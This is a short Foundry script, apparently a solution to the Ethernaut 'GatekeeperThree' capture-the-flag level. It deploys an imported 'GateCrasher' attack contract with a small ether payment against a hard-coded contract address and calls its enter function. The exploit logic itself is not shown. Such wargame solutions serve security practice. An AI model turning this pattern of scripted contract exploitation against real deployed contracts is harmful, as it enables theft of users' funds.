// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {GatekeeperThree} from "../instances/Ilevel28.sol";
import {GateCrasher} from "../src/level28.sol";

contract Attacker is Script {
    GatekeeperThree gate = GatekeeperThree(payable(0x3AD09b3fE01754d07B09b3df57f123766dF1cFf8));

    function run() external {
        vm.startBroadcast();

        GateCrasher crasher = new GateCrasher{value: 0.0011 ether}(address(gate));
        crasher.enter();

        vm.stopBroadcast();
    }
}
